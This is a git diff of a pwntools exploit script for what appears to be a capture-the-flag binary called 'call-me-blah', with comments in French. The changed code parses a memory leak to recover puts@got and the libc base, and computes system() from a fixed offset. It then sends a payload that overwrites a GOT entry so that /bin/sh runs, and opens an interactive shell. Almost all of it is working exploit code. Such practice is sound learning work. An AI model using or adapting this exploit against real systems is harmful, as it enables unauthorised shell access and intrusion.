@@ -3,6 +3,7 @@
 # This exploit template was generated via:
 # $ pwn template ./call-me-blah --host localhost --port 4000
 from pwn import *
+from time import sleep
 
 # Set up pwntools for the correct architecture
 exe = context.binary = ELF(args.EXE or './call-me-blah')
@@ -66,23 +67,54 @@ continue
 # PIE:        PIE enabled
 # Stripped:   No
 
-io = start()
+def con():
+    if args.GDB:
+        s = process([exe.path])
+        gdb.attach(s, gdbscript=gdbscript)
+        sleep(0.5)
+    elif args.REMOTE:
+        s = connect(host, port)
+    else:
+        s = process([exe.path])
+    return s
 
-leaked_address = int(io.recvline().strip(), 16)
-log.info(f"Leaked address: {hex(leaked_address)}")
+s = con()
 
-stdin_offset = libc.sym["_IO_2_1_stdin_"]
-libc.address = leaked_address - stdin_offset
-log.info(f"Libc base address: {hex(libc.address)}")
+# Recevoir la réponse jusqu'à l'invite "Where:"
+rep = s.recvuntil(b'Where:\n')
+print(rep.decode())
 
-system_address = libc.sym["system"]
-log.info(f"System address: {hex(system_address)}")
+# Traitement du leak pour récupérer l'adresse de puts@got et la base de la libc
+puts = rep.split(b'\n')[5].split(b'-')[0]
+puts = puts.decode()
+puts = int(puts, 16)
+
+base_libc = rep.split(b'\n')[7].split(b'-')[0]
+base_libc = base_libc.decode()
+base_libc = int(base_libc, 16)
+
+offset_sys = 0x004c490  
+
+system = base_libc + offset_sys
+
+print(hex(puts))
+print(hex(base_libc))
+print(hex(system))
+
+s.sendline(str(puts).encode())
+
+rep = s.recvuntil(b'What:\n')
 
 payload = flat(
-    cyclic(16)
+    cyclic(16), 
+    system,    
+    0x0,        
+    next(libc.search(b'/bin/sh')) 
 )
-io.sendline(str(system_address))    
-io.sendline("/bin/sh")              
 
-io.interactive()
+# Envoyer le payload
+s.sendline(payload)
+
+# Passer à l'interaction
+s.interactive()
 
